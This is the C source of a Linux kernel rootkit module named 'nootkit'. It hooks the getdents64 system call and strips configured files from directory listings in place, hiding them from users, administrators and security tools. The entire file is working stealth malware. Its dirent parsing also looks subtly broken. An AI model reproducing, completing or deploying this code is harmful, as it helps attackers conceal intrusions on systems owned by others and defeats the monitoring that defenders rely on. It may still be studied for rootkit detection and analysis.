#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <asm/syscall_wrapper.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/uaccess.h>

#include <hide.h>
#include <hook.h>
#include <license.h>
#include <ksyms.h>
#include <config.h>

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

/// @brief Replace a dirent's content with the next's, expanding
///     d_reclen to contain the new size while setting to 0 the trailing bytes.
/// @param dirent dirent to erase.
/// @attention dirent must not be the last in the array.
static void shift_back_switch(struct linux_dirent *dirent)
{
    struct linux_dirent *next = (void *)dirent + dirent->d_reclen;
    size_t prev_reclen = dirent->d_reclen;
    
    memcpy(dirent, next, next->d_reclen);
    memset((void *)dirent + dirent->d_reclen, 0, prev_reclen);
    dirent->d_reclen += prev_reclen;
}

/// @brief Filter a dirent buffer inplace according to nootkit's set configuration.
/// @param dirent Start of a linux_dirent buffer to filter inplace
/// @param count Size of the dirent buffer in bytes
/// @param path Absolute path to the directory the dirent listing is from - used for
///     filtering dirent by absolute path.
/// @param path_len Length of the path string.
/// @return The new size (in bytes) of the filtered dirent buffer.
static size_t filter_dirents(struct linux_dirent *dirent, size_t count, char *path, size_t path_len)
{
    int j, i;
    struct linux_dirent *cur_dirent;
    char *hide_cursor, *dirent_name;
    u8 dirent_namlen;

    for (j = 0; j < hide_filenames_count; j++) {
        hide_cursor = hide_filenames[j];

        // check if the current hide file starts with fd's path
        if (strncmp(hide_cursor, path, path_len))
            continue;
        hide_cursor += path_len;

        // if hide is exactly fd's path, don't hide children dirents (*hide_cursor == '\0').
        // if hide matches the path base partly, also don't do anything.
        if (*hide_cursor != '/')
            continue;
        hide_cursor += 1;

        // if the hide is set to a file UNDER fd's path, iterate all dirents
        cur_dirent = dirent;
        i = 0;
        while (i < count) {
            dirent_namlen = cur_dirent->d_name[0];
            dirent_name = &cur_dirent->d_name[1];

            // compare the rest of the path with the dirent name
            if (strncmp(hide_cursor, dirent_name, dirent_namlen)) {
                i += cur_dirent->d_reclen;
                cur_dirent = (struct linux_dirent *)((void *)dirent + i);
                continue;
            }
            
            // if cur is not last, override it with the content of the next dirent,
            // otherwise set it to 0 and decrement count
            if (cur_dirent->d_reclen + i < count) {
                shift_back_switch(cur_dirent);
            } else {
                count -= cur_dirent->d_reclen;
                memset(cur_dirent, 0, cur_dirent->d_reclen);
            }
        }
    }

    return count;
}

static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
{
    // syscall args
    int fd = (int)regs->di;
    struct linux_dirent *user = (void *)regs->si;
    size_t count = (size_t)regs->dx;

    long res = 0;
    struct linux_dirent *filtered;
    struct file *f;
    char *fd_path_buf, *fd_path;
    size_t fd_path_len;

    fd_path_buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!fd_path_buf) {
        // ENOMEM is not supposed to be returned by this syscall
        res = -EINVAL;
        goto error_fd_path;
    }

    // find fd's path and create string
    f = current->files->fdt->fd[fd];
    fd_path = d_path(&f->f_path, fd_path_buf, PAGE_SIZE);
    fd_path_len = strlen(fd_path);

    // allocate buffer to work on unfiltered dirents
    filtered = kmalloc(count, GFP_KERNEL);
    if (!filtered) {
        res = -EINVAL;
        goto error_filtered;
    }

    // perform original getdents64 on user supplied buffer
    res = hook_original__x64_sys_getdents64(regs);
    if (res < 0) {
        goto exit;
    }

    // copy contents of user buffer to private buffer
    if (__copy_from_user(filtered, user, count)) {
        res = -EINVAL;
        goto exit;
    }

    res = filter_dirents(filtered, res, fd_path, fd_path_len);

exit:
    // copy filtered buffer to user
    // we have nothing to do if this fails
    (void)(__copy_to_user(user, filtered, count) + 1);
    kfree(filtered);

error_filtered:
    kfree(fd_path_buf);

error_fd_path:
    return res;
}

HOOK_X64_SYSCALL_DEFINE(hide, getdents64, 217, &__x64_sys_getdents64_hook);
